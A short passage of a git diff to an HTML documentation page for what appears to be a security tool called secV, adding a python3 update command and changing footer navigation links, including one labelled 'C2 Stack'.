+<span class="hl">python3</span> update.py --sync-tools  <span class="cm"># fix permissions after git pull</span></code></pre>
         </div>
       </div>
 
@@ -906,7 +1687,9 @@ footer {
     <a class="foot-link" href="../../index.html">Home</a>
     <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
     <a class="foot-link" href="#modules">Modules</a>
-    <a class="foot-link" href="#shell">Shell</a>
+    <a class="foot-link" href="#architecture">Architecture</a>
+    <a class="foot-link" href="#internals">Internals</a>
+    <a class="foot-link" href="#c2stack">C2 Stack</a>
   </div>
   <span class="foot-note">MIT License · secV by 0xb0rn3</span>
 </footer>
